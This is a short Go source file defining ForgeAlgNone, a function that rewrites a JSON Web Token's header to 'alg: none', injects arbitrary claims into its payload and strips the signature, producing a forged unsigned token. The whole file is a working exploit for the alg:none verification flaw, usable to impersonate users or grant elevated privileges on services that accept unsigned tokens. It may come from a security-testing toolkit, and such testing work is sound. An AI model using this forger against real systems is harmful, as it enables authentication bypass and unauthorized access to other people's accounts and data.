package jwt

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// ForgeAlgNone modifies the JWT header to set "alg": "none", injects claims into the payload, and strips the signature.
func ForgeAlgNone(token string, claims map[string]interface{}) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("token is not a valid 3-part JWT")
	}

	// 1. Decode & Modify Header to {"alg":"none","typ":"JWT"}
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	var header map[string]interface{}
	if err == nil {
		json.Unmarshal(headerBytes, &header)
	} else {
		header = make(map[string]interface{})
	}
	header["alg"] = "none"
	if _, ok := header["typ"]; !ok {
		header["typ"] = "JWT"
	}

	newHeaderBytes, _ := json.Marshal(header)
	newHeaderB64 := base64.RawURLEncoding.EncodeToString(newHeaderBytes)

	// 2. Decode & Modify Payload
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return "", fmt.Errorf("failed to base64 decode JWT payload: %w", err)
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return "", fmt.Errorf("failed to parse JWT payload JSON: %w", err)
	}

	for k, v := range claims {
		payload[k] = v
	}

	newPayloadBytes, _ := json.Marshal(payload)
	newPayloadB64 := base64.RawURLEncoding.EncodeToString(newPayloadBytes)

	// 3. Return header.payload. (with trailing dot, no signature)
	return fmt.Sprintf("%s.%s.", newHeaderB64, newPayloadB64), nil
}
